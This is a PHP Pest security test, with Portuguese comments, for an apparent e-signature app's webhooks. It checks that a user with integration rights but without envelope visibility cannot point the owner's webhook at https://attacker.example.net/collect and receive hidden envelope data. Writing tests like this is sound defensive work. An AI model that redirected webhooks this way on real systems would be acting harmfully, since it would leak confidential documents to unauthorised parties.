<?php

use App\Enums\AuditEventType;
use App\Enums\Permission;
use App\Models\Organization;
use App\Models\WebhookDelivery;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;

require_once __DIR__.'/../../Phase2/Webhooks/Support/WebhookHelpers.php';

/*
|--------------------------------------------------------------------------
| Revisão 2D (webhooks) — desvio de endpoint alheio por quem enxerga menos
|--------------------------------------------------------------------------
| docs/fase-2/webhooks.md §7: o endpoint age com as permissões de QUEM RESPONDE por ele e,
| "na tela, o vínculo com o envelope e o corpo da entrega só aparecem para quem pode ver
| aquele envelope". Mas a WebhookEndpointPolicy::update só exige `manage_integrations`, e
| WebhookEndpointManager::update troca a URL sem transferir a responsabilidade. Uma função
| personalizada com `manage_integrations` e SEM `view_all_envelopes` aponta o endpoint do
| proprietário para a própria URL e passa a receber (e reenviar) os eventos de envelopes que
| a interface esconde dela.
*/

if (! function_exists('reviewWebhookPlanFeature')) {
    function reviewWebhookPlanFeature(Organization $organization, string $flag): void
    {
        config()->set('assinavelox.features.'.$flag, true);
        $plan = $organization->currentSubscription()->with('plan')->first()?->plan;

        if ($plan !== null) {
            $features = (array) ($plan->features ?? []);
            $features[$flag] = true;
            $plan->forceFill(['features' => $features])->save();
        }
    }
}

it('integrador sem view_all não consegue desviar para a própria URL eventos de envelopes que não vê', function (): void {
    ['organization' => $organization, 'owner' => $owner] = webhookOrg(['attacker.example.net' => ['93.184.215.35']]);
    reviewWebhookPlanFeature($organization, 'custom_roles');
    ['endpoint' => $endpoint] = makeEndpoint($organization, $owner);
    Http::fake(['*' => Http::response('ok', 200)]);

    $role = createCustomRole($organization, 'Só integrações', [Permission::ManageIntegrations]);
    $integrator = attachWithCustomRole($organization, $role);
    ['envelope' => $ownersEnvelope] = webhookEnvelope($organization, $owner);

    recordAudit($ownersEnvelope, AuditEventType::EnvelopeSent);
    $delivery = WebhookDelivery::withoutOrganizationScope()->sole();

    actingAsMember($integrator, $organization);
    $params = ['webhookEndpoint' => $endpoint->ulid];

    // Premissa: pela interface o integrador NÃO vê este envelope nem o corpo da entrega.
    $this->getJson(route('integrations.webhooks.deliveries.show', [...$params, 'delivery' => $delivery->ulid]))
        ->assertOk()
        ->assertJsonPath('payload_hidden', true);

    // Ataque: troca a URL do endpoint do proprietário, reenvia a entrega antiga e espera novos eventos.
    $this->patch(route('integrations.webhooks.update', $params), ['url' => 'https://attacker.example.net/collect']);
    $this->post(route('integrations.webhooks.deliveries.resend', [...$params, 'delivery' => $delivery->ulid]));
    recordAudit($ownersEnvelope, AuditEventType::EnvelopeSent);

    $leaked = collect(webhookRequests())
        ->filter(fn (Request $request): bool => str_contains($request->url(), 'attacker.example.net'))
        ->filter(fn (Request $request): bool => str_contains($request->body(), $ownersEnvelope->ulid));

    expect($leaked)->toHaveCount(0);
});
